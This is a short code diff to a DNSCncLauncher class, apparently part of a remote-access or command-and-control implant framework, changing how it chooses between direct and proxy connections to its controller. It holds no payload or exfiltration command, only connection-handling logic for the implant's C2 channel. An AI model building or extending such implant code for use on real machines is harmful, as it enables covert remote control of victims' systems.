@@ -168,6 +168,8 @@ class DNSCncLauncher(BaseLauncher):
 
     def try_connect_via_proxy(self, command):
         _, host, port, transport, connection_proxy = command
+        if connection_proxy is True:
+            connection_proxy = None
 
         for proxy_type, proxy, proxy_username, proxy_password in get_proxies(
                additional_proxies=[connection_proxy] if connection_proxy else None
@@ -250,7 +252,11 @@ class DNSCncLauncher(BaseLauncher):
                 logging.debug('processing connection command')
 
                 with dnscnc.lock:
-                    stream = self.try_direct_connect(command)
+                    if command[4]:
+                        stream = None
+                    else:
+                        stream = self.try_direct_connect(command)
+
                     if not stream:
                         for stream in self.try_connect_via_proxy(command):
                             if stream:
